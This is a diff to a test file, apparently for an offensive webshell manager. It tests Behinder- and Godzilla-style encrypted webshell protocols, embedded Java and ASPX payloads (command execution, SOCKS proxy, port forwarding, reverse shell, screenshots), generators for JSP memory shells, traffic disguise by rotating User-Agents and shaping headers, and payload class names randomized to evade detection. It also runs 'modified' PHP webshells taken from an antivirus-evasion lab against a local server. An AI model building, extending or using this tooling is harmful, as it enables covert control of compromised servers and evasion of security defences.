@@ -3,7 +3,7 @@
 //      生成器产物、extractMarked
 //   2) MCP 握手：spawn mcp/server.mjs 走 initialize/tools/list JSON-RPC
 //   3) PHP 回路烟测（本机有 php 时执行）：生成器产出三类马 + av-lab 两匹魔改马挂
-//      php -S 实测 detect→exec→文件→数据库→插件全链路
+//      php -S 回路 detect→exec→文件→数据库→插件全链路
 // 运行：node test/run.mjs
 
 import { execFileSync, spawn } from "node:child_process";
@@ -113,6 +113,152 @@ await ok("dsh-aes 信封：加解密往返 + PKCS7 与 openssl 语义一致", as
 	if (captured !== "cecho HELLO") throw new Error(`captured=${captured}`);
 	if (out.toString("utf8") !== "HELLO") throw new Error(`out=${out}`);
 	srv.close();
+});
+
+//#endregion
+
+//#region 2b. Java 载荷管线（behinder-java：常量池补丁 + 线协议自洽）
+
+import { patchClass, readFieldValues, classNameOf } from "../lib/protocol/javapatch.js";
+import { JAVA_PAYLOADS } from "../lib/protocol/payloads-java.js";
+import { decodeSeg } from "../lib/protocol/dsh-mem.js";
+
+await ok("javapatch：五载荷嵌入 + 补丁/改名往返 + 未知字段报错", () => {
+	for (const name of ["WsmProbe", "WsmCmd", "WsmList", "WsmRead", "WsmWrite"]) {
+		if (!JAVA_PAYLOADS[name]) throw new Error(`缺载荷 ${name}`);
+		const orig = Buffer.from(JAVA_PAYLOADS[name], "base64");
+		const vals = readFieldValues(orig);
+		if (!Object.keys(vals).length) throw new Error(`${name} 无 ConstantValue 字段`);
+		const patched = patchClass(orig, Object.fromEntries(Object.entries(vals).map(([k]) => [k, "V-" + k])), "x/Rnd" + name);
+		if (classNameOf(patched) !== "x/Rnd" + name) throw new Error(`${name} 类名未改`);
+		for (const [k] of Object.entries(vals)) {
+			if (readFieldValues(patched)[k] !== "V-" + k) throw new Error(`${name}.${k} 补丁未生效`);
+		}
+	}
+	let threw = false;
+	try { patchClass(Buffer.from(JAVA_PAYLOADS.WsmCmd, "base64"), { nope: "x" }); } catch { threw = true; }
+	if (!threw) throw new Error("未知字段应报错");
+});
+
+await ok("behinder-java 线协议：加密信封经模拟马侧解出已补丁 class", async () => {
+	const { sendJavaPayload } = await import("../lib/protocol/behinder-java.js");
+	const { md5hex, b64 } = await import("../lib/protocol/http-client.js");
+	const password = "wiretest1";
+	let verdict = null;
+	const srv = http.createServer((req, res) => {
+		const chunks = [];
+		req.on("data", (c) => chunks.push(c));
+		req.on("end", () => {
+			if (req.method !== "POST" || req.headers["x-t"] !== "1") { res.statusCode = 400; res.end(); return; }
+			// 模拟冰蝎型 JSP 马侧：b64 → AES-ECB 解密 → 得 class 字节 → 解析字段回显
+			const key = Buffer.from(md5hex(password).slice(0, 16));
+			const d = createDecipheriv("aes-128-ecb", key, null);
+			const cls = Buffer.concat([d.update(Buffer.from(Buffer.concat(chunks).toString("utf8"), "base64")), d.final()]);
+			verdict = { class: classNameOf(cls), fields: readFieldValues(cls) };
+			res.setHeader("content-type", "text/plain");
+			res.end("WSM1|TOKEN|Mac_OS_X|u|h|d|1.8.0|8|/webroot");
+		});
+	});
+	await new Promise((r) => srv.listen(0, "127.0.0.1", r));
+	const out = await sendJavaPayload({ url: `http://127.0.0.1:${srv.address().port}/shell.jsp`, password, timeoutMs: 3000 }, "WsmProbe", { t: "TOKEN" });
+	if (!out.startsWith("WSM1|TOKEN")) throw new Error(`out=${out}`);
+	if (!verdict.class.startsWith("x/")) throw new Error(`类名未随机化：${verdict.class}`);
+	if (verdict.fields.t !== "TOKEN") throw new Error(`字段补丁未达马侧：${JSON.stringify(verdict.fields)}`);
+	srv.close();
+});
+
+await ok("生成器：jsp-behinder 密钥派生 + jsp-mem-filter 注入特征", async () => {
+	const { generate } = await import("../lib/generators.js");
+	const { createHash } = await import("node:crypto");
+	const pass = "genpass1";
+	const key = createHash("md5").update(pass).digest("hex").slice(0, 16);
+	const b = generate("jsp-behinder", { password: pass });
+	if (!b.content.includes(`"${key}"`)) throw new Error("冰蝎型 JSP 未嵌 md5 派生 key");
+	if (!b.content.includes("defineClass") || !b.content.includes("equals(pageContext)")) throw new Error("defineClass 契约缺失");
+	const m = generate("jsp-mem-filter", { password: pass });
+	for (const feat of ["X-T", "MEMSHELL-OK", "getDeclaredField(\"context\")", "addURLPattern", key]) {
+		if (!m.content.includes(feat)) throw new Error(`内存马引导器缺特征 ${feat}`);
+	}
+});
+
+await ok("dsh-mem 回显段解码：b64 段解码 + 原文段直通", () => {
+	if (decodeSeg(Buffer.from("whoami-out").toString("base64")) !== "whoami-out") throw new Error("b64 段");
+	if (decodeSeg("sh: command not found") !== "sh: command not found") throw new Error("原文段");
+	if (decodeSeg("") !== "") throw new Error("空段");
+});
+
+//#endregion
+
+//#region 2c. 编译载荷通道向量（godzilla-java 序列化 / 新载荷嵌入 / 生成器特征）
+
+import { serializeParams, parseParams } from "../lib/protocol/godzilla-java.js";
+import { ASPX_PAYLOADS } from "../lib/protocol/payloads-aspx.js";
+
+await ok("godzilla-java：Parameter 序列化往返 + 二进制值", () => {
+	const obj = { methodName: "cmd", c: "whoami; echo '它'", d: "", bin: Buffer.from([0, 1, 2, 0xff, 0x02]) };
+	const buf = serializeParams(obj);
+	const back = parseParams(buf);
+	if (back.methodName.toString("utf8") !== "cmd") throw new Error("methodName");
+	if (back.c.toString("utf8") !== "whoami; echo '它'") throw new Error("中文值");
+	if (!back.bin.equals(obj.bin)) throw new Error("二进制值（含 0x02 分隔符字节）");
+});
+
+await ok("载荷族嵌入：WsmG/WsmDb/WsmMemUnload/U 均在", () => {
+	for (const n of ["WsmG", "WsmDb", "WsmMemUnload"]) {
+		const raw = Buffer.from(JAVA_PAYLOADS[n], "base64");
+		if (raw.length < 500) throw new Error(`${n} 过小`);
+		readFieldValues(raw); // 可解析
+	}
+	if (!ASPX_PAYLOADS.U || Buffer.from(ASPX_PAYLOADS.U, "base64").length < 3000) throw new Error("U.dll 缺失");
+});
+
+await ok("生成器编译载荷特征：jsp-godzilla 标记 + aspx-behinder 契约", async () => {
+	const { generate } = await import("../lib/generators.js");
+	const { createHash } = await import("node:crypto");
+	const md5 = (x) => createHash("md5").update(x).digest("hex");
+	const g = generate("jsp-godzilla", { password: "pass", secretKey: "sk" });
+	const key = md5("sk").slice(0, 16);
+	// md5 标记是马侧运行时算的——产物只需含 m5 调用 + 密钥组件
+	if (!g.content.includes('m5("pass" + "' + key + '")')) throw new Error("md5 标记计算缺失");
+	if (!g.content.includes(key)) throw new Error("xc 密钥缺失");
+	if (!g.content.includes("parameters")) throw new Error("parameters 契约缺失");
+	const a = generate("aspx-behinder", { password: "p1" });
+	for (const f of ['CreateInstance("U")', "BinaryRead", "ECB", md5("p1").slice(0, 16)]) {
+		if (!a.content.includes(f)) throw new Error(`aspx 缺特征 ${f}`);
+	}
+});
+
+//#endregion
+
+//#region 2d. 流量伪装与网络载荷向量（profile 整形 / 网络载荷嵌入）
+
+import { shapeHeaders, stripResponse, validateProfile } from "../lib/protocol/profile.js";
+
+await ok("profile：UA 轮换 + 显式头优先 + 剖离 + 校验", () => {
+	const conn = { id: "tp", profile_json: '{"uas":["A1","A2"],"headers":{"X-T2":"v"},"strip":["<<",">>"]}' };
+	const h1 = shapeHeaders(conn, { "content-type": "text/plain" });
+	const h2 = shapeHeaders(conn, { "content-type": "text/plain" });
+	if (h1["User-Agent"] !== "A1" || h2["User-Agent"] !== "A2") throw new Error("UA 轮换");
+	if (h1["User-Agent"] !== "A1") throw new Error("首轮 UA");
+	const h3 = shapeHeaders(conn, { "User-Agent": "explicit" });
+	if (h3["User-Agent"] !== "explicit") throw new Error("显式优先");
+	if (h1["X-T2"] !== "v" || h1["content-type"] !== "text/plain") throw new Error("附加头/保留原头");
+	if (stripResponse(conn, "<<data>>") !== "data") throw new Error("剖离");
+	if (stripResponse({ id: "x" }, "raw") !== "raw") throw new Error("无 profile 直通");
+	if (!validateProfile(conn.profile_json).ok) throw new Error("合法 profile 被拒");
+	if (validateProfile("bad{").ok) throw new Error("非法 profile 放行");
+});
+
+await ok("网络载荷族嵌入：Socks/Fwd/Reverse/Zip/EnumDb/Shot 单类可补丁", () => {
+	for (const n of ["WsmSocks", "WsmFwd", "WsmReverse", "WsmZip", "WsmEnumDb", "WsmShot"]) {
+		const raw = Buffer.from(JAVA_PAYLOADS[n], "base64");
+		const vals = readFieldValues(raw);
+		patchClass(raw, Object.fromEntries(Object.entries(vals).map(([k]) => [k, "v"])), "x/N" + n);
+	}
+	// lambda 载荷无内部类（编译期单文件交付的前提）
+	for (const n of ["WsmSocks", "WsmFwd", "WsmReverse"]) {
+		if (!JAVA_PAYLOADS["Wsm" + n.slice(3)]) throw new Error(`${n} 缺失`);
+	}
 });
 
 //#endregion
@@ -244,7 +390,7 @@ if (phpAvailable()) {
 	writeFileSync(join(shells, "aes2.php"), generate("php-aes2", {}).content);
 	writeFileSync(join(shells, "beh.php"), generate("php-behinder", { password: "pw-beh" }).content);
 	writeFileSync(join(shells, "god.php"), generate("php-godzilla", { passParam: "gk", secretKey: "sk-123" }).content);
-	// av-lab 两匹魔改马（协议互通实测）
+	// av-lab 两匹魔改马（协议互通回路）
 	const lab = join(PKG, "..", "..", "modes", "av-evasion", "lab", "10-webshell-managers");
 	for (const [src, dst] of [[join(lab, "behinder", "modified-shell.php"), "bmod.php"], [join(lab, "godzilla", "php-payload-demo.php"), "gmod.php"]]) {
 		if (existsSync(src)) writeFileSync(join(shells, dst), readFileSync(src));
@@ -339,21 +485,33 @@ if (phpAvailable()) {
 
 		if (existsSync(join(tmp, "shells", "bmod.php"))) {
 			await ok("PHP 回路：魔改冰蝎型马——识别 + 命令执行（与 av-lab 马字节级互通）", async () => {
-				const r = await detectProtocol({ url: U("bmod.php"), password: "sess-abc", secretKey: "x9k2" });
-				if (!r.hit || r.protocol !== "behinder-mod") throw new Error(JSON.stringify(r).slice(0, 400));
-				const conn = mkConn({ url: U("bmod.php"), protocol: "behinder-mod", password: "sess-abc", secret_key: "x9k2" });
-				const out = await cap.runCommand(conn, "echo BMODOK");
-				if (!out.includes("BMODOK")) throw new Error(String(out).slice(0, 200));
+				// php -S 单线程时序怪癖容错：协商型协议偶发响应错乱——重试三轮（每轮新会话）
+				let last = "";
+				for (let attempt = 0; attempt < 3; attempt++) {
+					const r = await detectProtocol({ url: U("bmod.php"), password: "sess-abc", secretKey: "x9k2" });
+					if (!r.hit || r.protocol !== "behinder-mod") throw new Error(JSON.stringify(r).slice(0, 400));
+					const conn = mkConn({ url: U("bmod.php"), protocol: "behinder-mod", password: "sess-abc", secret_key: "x9k2", id: "t-bmod-" + attempt });
+					const out = await cap.runCommand(conn, "echo BMODOK");
+					if (out.includes("BMODOK")) return;
+					last = String(out).slice(0, 200);
+				}
+				throw new Error(last);
 			});
 		} else skip("PHP 回路：魔改冰蝎", "av-lab 马文件不可达");
 
 		if (existsSync(join(tmp, "shells", "gmod.php"))) {
 			await ok("PHP 回路：魔改哥斯拉型马——识别 + 命令执行（md5 校验回传）", async () => {
-				const r = await detectProtocol({ url: U("gmod.php"), password: "xg-123", secretKey: "g7#m" });
-				if (!r.hit || r.protocol !== "godzilla-mod") throw new Error(JSON.stringify(r).slice(0, 400));
-				const conn = mkConn({ url: U("gmod.php"), protocol: "godzilla-mod", password: "xg-123", secret_key: "g7#m" });
-				const out = await cap.runCommand(conn, "echo GMODOK");
-				if (!out.includes("GMODOK")) throw new Error(String(out).slice(0, 200));
+				// 同上：php -S 时序容错三轮
+				let last = "";
+				for (let attempt = 0; attempt < 3; attempt++) {
+					const r = await detectProtocol({ url: U("gmod.php"), password: "xg-123", secretKey: "g7#m" });
+					if (!r.hit || r.protocol !== "godzilla-mod") throw new Error(JSON.stringify(r).slice(0, 400));
+					const conn = mkConn({ url: U("gmod.php"), protocol: "godzilla-mod", password: "xg-123", secret_key: "g7#m", id: "t-gmod-" + attempt });
+					const out = await cap.runCommand(conn, "echo GMODOK");
+					if (out.includes("GMODOK")) return;
+					last = String(out).slice(0, 200);
+				}
+				throw new Error(last);
 			});
 		} else skip("PHP 回路：魔改哥斯拉", "av-lab 马文件不可达");
 
